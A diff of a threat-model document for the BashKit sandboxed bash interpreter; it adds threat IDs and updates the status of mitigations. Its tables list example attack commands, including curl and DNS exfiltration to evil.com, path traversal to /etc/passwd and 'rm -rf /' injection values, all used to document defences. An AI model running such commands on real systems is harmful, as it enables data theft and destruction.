@@ -9,6 +9,49 @@ BashKit is a sandboxed bash interpreter for multi-tenant environments, primarily
 
 ---
 
+## Threat ID Management
+
+This section documents the process for managing stable threat IDs.
+
+### ID Scheme
+
+All threats use a stable ID format: `TM-<CATEGORY>-<NUMBER>`
+
+| Prefix | Category | Description |
+|--------|----------|-------------|
+| TM-DOS | Denial of Service | Resource exhaustion, infinite loops, CPU/memory attacks |
+| TM-ESC | Sandbox Escape | Filesystem escape, process escape, privilege escalation |
+| TM-INF | Information Disclosure | Secrets access, host info leakage, data exfiltration |
+| TM-INJ | Injection | Command injection, path injection |
+| TM-NET | Network Security | DNS manipulation, HTTP attacks, network bypass |
+| TM-ISO | Isolation | Multi-tenant cross-access |
+
+### Adding New Threats
+
+1. **Assign ID**: Use next available number in category (e.g., TM-DOS-010)
+2. **Never reuse IDs**: Deprecated threats keep their ID with `[DEPRECATED]` prefix
+3. **Update public doc**: Add entry to `crates/bashkit/docs/threat-model.md`
+4. **Add code comment**: Reference threat ID at mitigation point (see format below)
+5. **Add test**: Create test in `tests/threat_model_tests.rs` referencing ID
+
+### Code Comment Format
+
+```rust
+// THREAT[TM-XXX-NNN]: Brief description of the threat being mitigated
+// Mitigation: What this code does to prevent the attack
+```
+
+### Public Documentation
+
+The public-facing threat model lives in `crates/bashkit/docs/threat-model.md` and is
+embedded in rustdoc. It contains:
+- High-level threat categories
+- Attack vectors and mitigations
+- Links to relevant code and tests
+- Caller responsibilities
+
+---
+
 ## Trust Model
 
 ```
@@ -43,46 +86,44 @@ BashKit is a sandboxed bash interpreter for multi-tenant environments, primarily
 
 #### 1.1 Memory Exhaustion
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Large script input | `Bash::exec(huge_string)` | None | **VULNERABLE** |
-| Output flooding | `yes \| head -n 1000000000` | None | **VULNERABLE** |
-| Variable explosion | `x=$(cat /dev/urandom)` | No /dev/urandom | Mitigated |
-| Array growth | `arr+=(element)` in loop | Command limit | Mitigated |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-001 | Large script input | `Bash::exec(huge_string)` | `max_input_bytes` limit (10MB) | **MITIGATED** |
+| TM-DOS-002 | Output flooding | `yes \| head -n 1000000000` | Command limit stops loop | Mitigated |
+| TM-DOS-003 | Variable explosion | `x=$(cat /dev/urandom)` | No /dev/urandom in VFS | Mitigated |
+| TM-DOS-004 | Array growth | `arr+=(element)` in loop | Command limit | Mitigated |
 
-**Current Risk**: HIGH - No input size limit, no output buffer limit
+**Current Risk**: LOW - Input size and command limits prevent unbounded memory consumption
 
-**Recommendations**:
+**Implementation**: `ExecutionLimits` in `limits.rs`:
 ```rust
-// Add to ExecutionLimits
-max_input_bytes: 10_000_000,    // 10MB script limit
-max_output_bytes: 10_000_000,   // 10MB stdout+stderr
-max_variable_size: 1_000_000,   // 1MB per variable
+max_input_bytes: 10_000_000,    // 10MB script limit (TM-DOS-001)
+max_commands: 10_000,           // Command limit (TM-DOS-002, TM-DOS-004)
 ```
 
 #### 1.5 Filesystem Exhaustion
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Large file creation | `dd if=/dev/zero bs=1G count=100` | FS limits | **MITIGATED** |
-| Many small files | `for i in $(seq 1 1000000); do touch $i; done` | File count limit | **MITIGATED** |
-| Zip bomb | `gunzip bomb.gz` (small file → huge output) | Decompression limit | **MITIGATED** |
-| Tar bomb | `tar -xf bomb.tar` (many files / large files) | FS limits | **MITIGATED** |
-| Recursive copy | `cp -r /tmp /tmp/copy` | FS limits | **MITIGATED** |
-| Append flood | `while true; do echo x >> file; done` | FS limits + loop limit | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-005 | Large file creation | `dd if=/dev/zero bs=1G count=100` | `max_file_size` limit | **MITIGATED** |
+| TM-DOS-006 | Many small files | `for i in $(seq 1 1000000); do touch $i; done` | `max_file_count` limit | **MITIGATED** |
+| TM-DOS-007 | Zip bomb | `gunzip bomb.gz` (small file → huge output) | Decompression limit | **MITIGATED** |
+| TM-DOS-008 | Tar bomb | `tar -xf bomb.tar` (many files / large files) | FS limits | **MITIGATED** |
+| TM-DOS-009 | Recursive copy | `cp -r /tmp /tmp/copy` | FS limits | **MITIGATED** |
+| TM-DOS-010 | Append flood | `while true; do echo x >> file; done` | FS limits + loop limit | **MITIGATED** |
 
 **Current Risk**: LOW - Filesystem limits prevent unbounded memory consumption
 
 **Implementation**: `FsLimits` struct in `fs/limits.rs`:
 ```rust
 FsLimits {
-    max_total_bytes: 100_000_000,    // 100MB total filesystem
-    max_file_size: 10_000_000,       // 10MB per file
-    max_file_count: 10_000,          // 10K files max
+    max_total_bytes: 100_000_000,    // 100MB total (TM-DOS-005, TM-DOS-008, TM-DOS-009)
+    max_file_size: 10_000_000,       // 10MB per file (TM-DOS-005, TM-DOS-007)
+    max_file_count: 10_000,          // 10K files max (TM-DOS-006, TM-DOS-008)
 }
 ```
 
-**Zip Bomb Protection**:
+**Zip Bomb Protection** (TM-DOS-007):
 - Decompression operations check output size against `max_file_size`
 - Archive extraction checks total extracted size against `max_total_bytes`
 - Extraction aborts early if limits would be exceeded
@@ -91,59 +132,78 @@ FsLimits {
 
 #### 1.6 Path and Name Attacks
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Symlink loops | `ln -s /a /b; ln -s /b /a` | No symlink following | **MITIGATED** |
-| Deep directory nesting | `mkdir -p a/b/c/.../z` (1000 levels) | None | **VULNERABLE** |
-| Long filenames | Create 10KB filename | None | **VULNERABLE** |
-| Many directory entries | Create 1M files in one dir | File count limit | **MITIGATED** |
-| Unicode path attacks | Homoglyph/RTL override chars | None | **VULNERABLE** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-011 | Symlink loops | `ln -s /a /b; ln -s /b /a` | No symlink following | **MITIGATED** |
+| TM-DOS-012 | Deep directory nesting | `mkdir -p a/b/c/.../z` (1000 levels) | None | **VULNERABLE** |
+| TM-DOS-013 | Long filenames | Create 10KB filename | None | **VULNERABLE** |
+| TM-DOS-014 | Many directory entries | Create 1M files in one dir | `max_file_count` limit | **MITIGATED** |
+| TM-DOS-015 | Unicode path attacks | Homoglyph/RTL override chars | None | **VULNERABLE** |
 
 **Current Risk**: MEDIUM - Some vectors unprotected
 
 **Recommendations**:
 ```rust
 // Add to FsLimits or separate PathLimits
-max_path_depth: 100,           // Max directory nesting
-max_filename_length: 255,      // Max single component
+max_path_depth: 100,           // Max directory nesting (TM-DOS-012)
+max_filename_length: 255,      // Max single component (TM-DOS-013)
 max_path_length: 4096,         // Max total path
 ```
 
-**Note**: Symlink loops are mitigated because InMemoryFs stores symlinks but doesn't
+**Note**: Symlink loops (TM-DOS-011) are mitigated because InMemoryFs stores symlinks but doesn't
 follow them during path resolution - symlink targets are only returned by `read_link()`.
 
 #### 1.2 Infinite Loops
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| While true | `while true; do :; done` | Loop limit (10K) | **MITIGATED** |
-| For loop | `for i in $(seq 1 inf); do` | Loop limit | **MITIGATED** |
-| Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop counter | Partial |
-| Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-016 | While true | `while true; do :; done` | Loop limit (10K) | **MITIGATED** |
+| TM-DOS-017 | For loop | `for i in $(seq 1 inf); do` | Loop limit | **MITIGATED** |
+| TM-DOS-018 | Nested loops | `for i in ...; do for j in ...; done; done` | Per-loop counter | Partial |
+| TM-DOS-019 | Command loop | `echo 1; echo 2; ...` x 100K | Command limit (10K) | **MITIGATED** |
 
 **Current Risk**: LOW - Loop and command limits prevent infinite execution
 
-**Gap**: Nested loops each get fresh 10K counter. Deep nesting could execute 10K^depth commands.
+**Implementation**: `limits.rs`
+```rust
+max_loop_iterations: 10_000,  // Per-loop limit (TM-DOS-016, TM-DOS-017)
+max_commands: 10_000,         // Total command limit (TM-DOS-019)
+```
+
+**Gap** (TM-DOS-018): Nested loops each get fresh 10K counter. Deep nesting could execute 10K^depth commands.
 
 #### 1.3 Stack Overflow (Recursion)
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Function recursion | `f() { f; }; f` | Depth limit (100) | **MITIGATED** |
-| Command sub nesting | `$($($($())))` | Depth limit | **MITIGATED** |
-| Parser recursion | Deeply nested `(((())))` | None | **VULNERABLE** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-020 | Function recursion | `f() { f; }; f` | Depth limit (100) | **MITIGATED** |
+| TM-DOS-021 | Command sub nesting | `$($($($())))` | Depth limit | **MITIGATED** |
+| TM-DOS-022 | Parser recursion | Deeply nested `(((())))` | `max_ast_depth` limit (100) | **MITIGATED** |
 
-**Current Risk**: MEDIUM - Execution protected, parser vulnerable
+**Current Risk**: LOW - Both execution and parser protected
+
+**Implementation**: `limits.rs`
+```rust
+max_function_depth: 100,      // Runtime recursion (TM-DOS-020, TM-DOS-021)
+max_ast_depth: 100,           // Parser recursion (TM-DOS-022)
+```
 
 #### 1.4 CPU Exhaustion
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
-| Parser hang | `for i in 1; do echo; done; echo done` | None | **VULNERABLE** |
-| Regex backtrack | `grep "a](*b)*c" file` | Regex crate limits | Partial |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-DOS-023 | Long computation | Complex awk/sed regex | Timeout (30s) | **MITIGATED** |
+| TM-DOS-024 | Parser hang | Malformed input | `parser_timeout` (5s) + `max_parser_operations` | **MITIGATED** |
+| TM-DOS-025 | Regex backtrack | `grep "a](*b)*c" file` | Regex crate limits | Partial |
 
-**Current Risk**: MEDIUM - Known parser hang on reserved words
+**Current Risk**: LOW - Parser timeout and fuel model prevent hangs
+
+**Implementation**: `limits.rs`
+```rust
+timeout: Duration::from_secs(30),       // Execution timeout (TM-DOS-023)
+parser_timeout: Duration::from_secs(5), // Parser timeout (TM-DOS-024)
+max_parser_operations: 100_000,         // Parser fuel (TM-DOS-024)
+```
 
 ---
 
@@ -151,40 +211,42 @@ follow them during path resolution - symlink targets are only returned by `read_
 
 #### 2.1 Filesystem Escape
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Path traversal | `cat ../../../etc/passwd` | Path normalization | **MITIGATED** |
-| Symlink escape | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | **MITIGATED** |
-| Real FS access | Direct syscalls | No real FS by default | **MITIGATED** |
-| Mount escape | Mount real paths | MountableFs controlled | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-ESC-001 | Path traversal | `cat ../../../etc/passwd` | Path normalization | **MITIGATED** |
+| TM-ESC-002 | Symlink escape | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | **MITIGATED** |
+| TM-ESC-003 | Real FS access | Direct syscalls | No real FS by default | **MITIGATED** |
+| TM-ESC-004 | Mount escape | Mount real paths | MountableFs controlled | **MITIGATED** |
 
 **Current Risk**: LOW - Virtual filesystem provides strong isolation
 
-**Code Reference**: `fs/memory.rs:81-105` (normalize_path)
+**Implementation**: `fs/memory.rs` - `normalize_path()` function
+- Collapses `..` components at path boundaries
+- Ensures all paths stay within virtual root
 
 #### 2.2 Process Escape
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Shell escape | `exec /bin/bash` | exec not implemented (returns exit 127) | **MITIGATED** |
-| Subprocess | `./malicious` | External exec disabled (returns exit 127) | **MITIGATED** |
-| Background proc | `malicious &` | Background not impl | **MITIGATED** |
-| eval injection | `eval "$user_input"` | eval runs in sandbox (can only execute builtins) | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-ESC-005 | Shell escape | `exec /bin/bash` | exec not implemented (returns exit 127) | **MITIGATED** |
+| TM-ESC-006 | Subprocess | `./malicious` | External exec disabled (returns exit 127) | **MITIGATED** |
+| TM-ESC-007 | Background proc | `malicious &` | Background not implemented | **MITIGATED** |
+| TM-ESC-008 | eval injection | `eval "$user_input"` | eval runs in sandbox (builtins only) | **MITIGATED** |
 
 **Current Risk**: LOW - No external process execution capability
 
-**Note**: Unimplemented commands return bash-compatible error:
+**Implementation**: Unimplemented commands return bash-compatible error:
 - Exit code: 127
 - Stderr: `bash: <cmd>: command not found`
 - Script continues execution (unless `set -e`)
 
 #### 2.3 Privilege Escalation
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| sudo/su | `sudo rm -rf /` | Not implemented | **MITIGATED** |
-| setuid | Permission changes | Virtual FS, no real perms | **MITIGATED** |
-| Capability abuse | Linux capabilities | Runs in-process | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-ESC-009 | sudo/su | `sudo rm -rf /` | Not implemented | **MITIGATED** |
+| TM-ESC-010 | setuid | Permission changes | Virtual FS, no real perms | **MITIGATED** |
+| TM-ESC-011 | Capability abuse | Linux capabilities | Runs in-process | **MITIGATED** |
 
 **Current Risk**: NONE - No privilege operations available
 
@@ -194,16 +256,16 @@ follow them during path resolution - symlink targets are only returned by `read_
 
 #### 3.1 Secrets Access
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Env var leak | `echo $SECRET_KEY` | Env vars caller-controlled | **CALLER RISK** |
-| File secrets | `cat /secrets/key` | Virtual FS isolation | **MITIGATED** |
-| Proc secrets | `/proc/self/environ` | No /proc filesystem | **MITIGATED** |
-| Memory dump | Core dumps | No crash dumps | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INF-001 | Env var leak | `echo $SECRET_KEY` | Env vars caller-controlled | **CALLER RISK** |
+| TM-INF-002 | File secrets | `cat /secrets/key` | Virtual FS isolation | **MITIGATED** |
+| TM-INF-003 | Proc secrets | `/proc/self/environ` | No /proc filesystem | **MITIGATED** |
+| TM-INF-004 | Memory dump | Core dumps | No crash dumps | **MITIGATED** |
 
 **Current Risk**: MEDIUM - Caller must sanitize environment variables
 
-**Recommendation**: Document that callers should NOT pass sensitive env vars:
+**Caller Responsibility** (TM-INF-001): Do NOT pass sensitive env vars:
 ```rust
 // UNSAFE - leaks secrets
 Bash::builder()
@@ -218,13 +280,13 @@ Bash::builder()
 
 #### 3.2 Host Information
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Hostname | `hostname`, `$HOSTNAME` | Returns configurable sandbox value (default: "bashkit-sandbox") | **MITIGATED** |
-| Username | `whoami`, `$USER` | Returns configurable sandbox value (default: "sandbox") | **MITIGATED** |
-| IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
-| System info | `uname -a` | Returns configurable sandbox values | **MITIGATED** |
-| User ID | `id` | Returns hardcoded uid=1000 with configurable username | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INF-005 | Hostname | `hostname`, `$HOSTNAME` | Returns configurable sandbox value | **MITIGATED** |
+| TM-INF-006 | Username | `whoami`, `$USER` | Returns configurable sandbox value | **MITIGATED** |
+| TM-INF-007 | IP address | `ip addr`, `ifconfig` | Not implemented | **MITIGATED** |
+| TM-INF-008 | System info | `uname -a` | Returns configurable sandbox values | **MITIGATED** |
+| TM-INF-009 | User ID | `id` | Returns hardcoded uid=1000 | **MITIGATED** |
 
 **Current Risk**: NONE - System builtins return configurable sandbox values (never real host info)
 
@@ -244,11 +306,11 @@ Bash::builder()
 
 #### 3.3 Network Exfiltration
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| HTTP exfil | `curl https://evil.com?data=$SECRET` | Network allowlist | **MITIGATED** |
-| DNS exfil | `nslookup $SECRET.evil.com` | No DNS commands | **MITIGATED** |
-| Timing channel | Response time variations | Not addressed | Minimal risk |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INF-010 | HTTP exfil | `curl https://evil.com?data=$SECRET` | Network allowlist | **MITIGATED** |
+| TM-INF-011 | DNS exfil | `nslookup $SECRET.evil.com` | No DNS commands | **MITIGATED** |
+| TM-INF-012 | Timing channel | Response time variations | Not addressed | Minimal risk |
 
 **Current Risk**: LOW - Network allowlist blocks unauthorized destinations
 
@@ -258,11 +320,11 @@ Bash::builder()
 
 #### 4.1 Command Injection
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Variable injection | `$user_input` containing `; rm -rf /` | Variables not re-parsed | **MITIGATED** |
-| Backtick injection | `` `$malicious` `` | Parsed as command sub | **MITIGATED** |
-| eval bypass | `eval $user_input` | eval sandboxed (only runs builtins) | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INJ-001 | Variable injection | `$user_input` containing `; rm -rf /` | Variables not re-parsed | **MITIGATED** |
+| TM-INJ-002 | Backtick injection | `` `$malicious` `` | Parsed as command sub | **MITIGATED** |
+| TM-INJ-003 | eval bypass | `eval $user_input` | eval sandboxed (builtins only) | **MITIGATED** |
 
 **Current Risk**: LOW - Bash's quoting rules apply, variables expand to strings only
 
@@ -276,24 +338,24 @@ echo $user_input
 
 #### 4.2 Path Injection
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Null byte | `cat "file\x00/../etc/passwd"` | Rust strings no nulls | **MITIGATED** |
-| Path traversal | `../../../../etc/passwd` | Path normalization | **MITIGATED** |
-| Encoding bypass | URL/unicode encoding | PathBuf handles | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INJ-004 | Null byte | `cat "file\x00/../etc/passwd"` | Rust strings no nulls | **MITIGATED** |
+| TM-INJ-005 | Path traversal | `../../../../etc/passwd` | Path normalization | **MITIGATED** |
+| TM-INJ-006 | Encoding bypass | URL/unicode encoding | PathBuf handles | **MITIGATED** |
 
 **Current Risk**: NONE - Rust's type system prevents these attacks
 
 #### 4.3 XSS-like Issues
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| HTML in output | Script outputs `<script>` | N/A - CLI tool | **NOT APPLICABLE** |
-| Terminal escape | ANSI escape sequences | Caller should sanitize | **CALLER RISK** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-INJ-007 | HTML in output | Script outputs `<script>` | N/A - CLI tool | **NOT APPLICABLE** |
+| TM-INJ-008 | Terminal escape | ANSI escape sequences | Caller should sanitize | **CALLER RISK** |
 
 **Current Risk**: LOW - BashKit is not a web application
 
-**Note**: If output is displayed in a terminal or web UI, callers should sanitize:
+**Caller Responsibility** (TM-INJ-008): Sanitize output if displayed in terminal/web UI:
 ```rust
 let result = bash.exec(script).await?;
 let safe_output = sanitize_terminal_escapes(&result.stdout);
@@ -305,15 +367,15 @@ let safe_output = sanitize_terminal_escapes(&result.stdout);
 
 #### 5.1 DNS Manipulation
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
-| DNS rebinding | Rebind after allowlist check | Literal host matching | **MITIGATED** |
-| DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
+| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching | **MITIGATED** |
+| TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
 
 **Current Risk**: NONE - Network allowlist uses literal host/IP matching, no DNS
 
-**Code Reference**: `network/allowlist.rs:78-111`
+**Implementation**: `network/allowlist.rs` - `matches_pattern()` function
 ```rust
 // Allowlist matches literal strings, not resolved IPs
 allowlist.allow("https://api.example.com");
@@ -322,45 +384,45 @@ allowlist.allow("https://api.example.com");
 
 #### 5.2 Network Bypass
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| IP instead of host | `curl http://93.184.216.34` | Literal IP blocked unless allowed | **MITIGATED** |
-| Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
-| Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
-| Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-NET-004 | IP instead of host | `curl http://93.184.216.34` | Literal IP blocked unless allowed | **MITIGATED** |
+| TM-NET-005 | Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
+| TM-NET-006 | Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
+| TM-NET-007 | Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |
 
 **Current Risk**: LOW - Strict allowlist enforcement
 
 #### 5.3 HTTP Attack Vectors
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Large response DoS | `curl https://evil.com/huge.bin` | Response size limit (10MB) | **MITIGATED** |
-| Connection hang | Server never responds | Connection timeout (10s) + read timeout (30s) | **MITIGATED** |
-| Slowloris attack | Slow response dripping | Read timeout (30s) | **MITIGATED** |
-| Redirect bypass | `Location: http://evil.com` | Redirects not auto-followed | **MITIGATED** |
-| Chunked encoding bomb | Infinite chunked response | Response size limit (streaming) | **MITIGATED** |
-| Gzip bomb / Zip bomb | 10KB gzip → 10GB decompressed | Auto-decompression disabled | **MITIGATED** |
-| DNS rebind via redirect | Redirect to rebinded IP | Manual redirect requires allowlist check | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-NET-008 | Large response DoS | `curl https://evil.com/huge.bin` | Response size limit (10MB) | **MITIGATED** |
+| TM-NET-009 | Connection hang | Server never responds | Connection timeout (10s) + read timeout (30s) | **MITIGATED** |
+| TM-NET-010 | Slowloris attack | Slow response dripping | Read timeout (30s) | **MITIGATED** |
+| TM-NET-011 | Redirect bypass | `Location: http://evil.com` | Redirects not auto-followed | **MITIGATED** |
+| TM-NET-012 | Chunked encoding bomb | Infinite chunked response | Response size limit (streaming) | **MITIGATED** |
+| TM-NET-013 | Gzip bomb / Zip bomb | 10KB gzip → 10GB decompressed | Auto-decompression disabled | **MITIGATED** |
+| TM-NET-014 | DNS rebind via redirect | Redirect to rebinded IP | Manual redirect requires allowlist check | **MITIGATED** |
 
 **Current Risk**: LOW - Multiple mitigations in place
 
-**Code Reference**: `network/client.rs`
+**Implementation**: `network/client.rs`
 ```rust
-// Security defaults
+// Security defaults (TM-NET-008, TM-NET-009, TM-NET-010)
 const DEFAULT_MAX_RESPONSE_BYTES: usize = 10 * 1024 * 1024;  // 10MB
 const DEFAULT_TIMEOUT_SECS: u64 = 30;
 const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
 
-// Redirects disabled by default
+// Redirects disabled by default (TM-NET-011, TM-NET-014)
 .redirect(reqwest::redirect::Policy::none())
 
-// Decompression disabled to prevent zip bombs
+// Decompression disabled to prevent zip bombs (TM-NET-013)
 .no_gzip()
 .no_brotli()
 .no_deflate()
 
-// Response size checked during streaming
+// Response size checked during streaming (TM-NET-008, TM-NET-012)
 async fn read_body_with_limit(&self, response: Response) -> Result<Vec<u8>> {
     // Streams response, checks size at each chunk
 }
@@ -449,17 +511,17 @@ Script: curl https://api.example.com/data
 
 #### 6.1 Cross-Tenant Access
 
-| Threat | Attack Vector | Mitigation | Status |
-|--------|--------------|------------|--------|
-| Shared filesystem | Access other tenant files | Separate Bash instances | **MITIGATED** |
-| Shared memory | Read other tenant data | Rust memory safety | **MITIGATED** |
-| Resource starvation | One tenant exhausts limits | Per-instance limits | **MITIGATED** |
+| ID | Threat | Attack Vector | Mitigation | Status |
+|----|--------|--------------|------------|--------|
+| TM-ISO-001 | Shared filesystem | Access other tenant files | Separate Bash instances | **MITIGATED** |
+| TM-ISO-002 | Shared memory | Read other tenant data | Rust memory safety | **MITIGATED** |
+| TM-ISO-003 | Resource starvation | One tenant exhausts limits | Per-instance limits | **MITIGATED** |
 
 **Current Risk**: LOW - Each Bash instance is fully isolated
 
-**Usage Pattern**:
+**Implementation**: Each tenant gets separate instance with isolated state:
 ```rust
-// Each tenant gets isolated instance
+// Each tenant gets isolated instance (TM-ISO-001, TM-ISO-002, TM-ISO-003)
 let tenant_a = Bash::builder()
     .fs(Arc::new(InMemoryFs::new()))
     .limits(tenant_limits)
@@ -475,64 +537,62 @@ let tenant_b = Bash::builder()
 
 ## Vulnerability Summary
 
-### Critical (Immediate Action Required)
+This section maps former vulnerability IDs to the new threat ID scheme and tracks status.
 
-| ID | Vulnerability | Impact | Mitigation |
-|----|--------------|--------|------------|
-| V1 | No input size limit | Memory exhaustion | Add `max_input_bytes` limit |
-| V2 | No output buffer limit | Memory exhaustion | Add `max_output_bytes` limit |
-| V3 | Parser hang on reserved words | CPU DoS | Add parser timeout |
+### Mitigated (Previously Critical/High)
 
-### High (Should Fix)
+| Old ID | Threat ID | Vulnerability | Status |
+|--------|-----------|---------------|--------|
+| V1 | TM-DOS-001 | Large script input | **MITIGATED** via `max_input_bytes` |
+| V2 | TM-DOS-002 | Output flooding | **MITIGATED** via command limits |
+| V3 | TM-DOS-024 | Parser hang | **MITIGATED** via `parser_timeout` + `max_parser_operations` |
+| V4 | TM-DOS-022 | Parser recursion | **MITIGATED** via `max_ast_depth` |
+| V5 | TM-DOS-018 | Nested loop multiplication | **PARTIAL** - still gaps |
 
-| ID | Vulnerability | Impact | Mitigation |
-|----|--------------|--------|------------|
-| V4 | No parser recursion limit | Stack overflow | Limit AST depth |
-| V5 | Nested loops multiply limits | Excessive execution | Aggregate loop counter |
+### Open (Medium Priority)
 
-### Medium (Track)
+| Threat ID | Vulnerability | Impact | Recommendation |
+|-----------|---------------|--------|----------------|
+| TM-INF-001 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
+| TM-INJ-008 | Terminal escapes in output | UI manipulation | Document sanitization need |
+| TM-DOS-012 | Deep directory nesting | Memory/stack exhaustion | Add `max_path_depth` limit |
+| TM-DOS-013 | Long filenames | Memory exhaustion | Add `max_filename_length` limit |
+| TM-DOS-015 | Unicode path manipulation | Path confusion | Validate/normalize paths |
 
-| ID | Vulnerability | Impact | Mitigation |
-|----|--------------|--------|------------|
-| V6 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
-| V7 | Terminal escapes in output | UI manipulation | Document sanitization need |
-| V8 | Deep directory nesting | Memory/stack exhaustion | Add `max_path_depth` limit |
-| V9 | Long filenames | Memory exhaustion | Add `max_filename_length` limit |
-| V10 | Unicode path manipulation | Path confusion | Validate/normalize paths |
+### Accepted (Low Priority)
 
-### Low (Acceptable)
-
-| ID | Vulnerability | Impact | Mitigation |
-|----|--------------|--------|------------|
-| V11 | Symlinks not followed | Functionality gap | Implement with loop detection |
-| V12 | Globs incomplete | Functionality gap | Complete implementation |
+| Threat ID | Vulnerability | Impact | Rationale |
+|-----------|---------------|--------|-----------|
+| TM-DOS-011 | Symlinks not followed | Functionality gap | By design - prevents symlink attacks |
+| TM-DOS-025 | Regex backtracking | CPU exhaustion | Regex crate has internal limits |
 
 ---
 
 ## Security Controls Matrix
 
-| Control | Threat Mitigated | Implementation | Tested |
-|---------|-----------------|----------------|--------|
-| Command limit (10K) | Infinite execution | `limits.rs` | Yes |
-| Loop limit (10K) | Infinite loops | `limits.rs` | Yes |
-| Function depth (100) | Stack overflow | `limits.rs` | Yes |
-| Timeout (30s) | CPU exhaustion | `limits.rs` | Partial |
-| Virtual filesystem | FS escape | `fs/memory.rs` | Yes |
-| Filesystem limits | FS exhaustion | `fs/limits.rs` | Yes |
-| Zip bomb protection | Decompression bomb | `builtins/archive.rs` | Yes |
-| Path normalization | Path traversal | `fs/memory.rs` | Yes |
-| No symlink following | Symlink loops | `fs/memory.rs` | Yes |
-| Network allowlist | Data exfiltration | `network/allowlist.rs` | Yes |
-| Sandboxed eval, no exec | Code injection | eval runs builtins only, exec not implemented | Yes |
-| Fail-point testing | Control bypass | `security_failpoint_tests.rs` | Yes |
-| Builtin panic catching | Custom builtin crashes | `interpreter/mod.rs` | Yes |
-| Error message sanitization | Information disclosure | `builtin_error_security_tests.rs` | Yes |
-| HTTP response size limit | Memory exhaustion | `network/client.rs` | Yes |
-| HTTP connect timeout | Connection hang | `network/client.rs` | Yes |
-| HTTP read timeout | Slow response DoS | `network/client.rs` | Yes |
-| No auto-redirect | Redirect bypass | `network/client.rs` | Yes |
-| Streaming body read | Large response DoS | `network/client.rs` | Yes |
-| Zip bomb protection | Compression attacks | `builtins/curl.rs` | Yes |
+| Control | Threat IDs | Implementation | Tested |
+|---------|------------|----------------|--------|
+| Input size limit (10MB) | TM-DOS-001 | `limits.rs` | Yes |
+| Command limit (10K) | TM-DOS-002, TM-DOS-004, TM-DOS-019 | `limits.rs` | Yes |
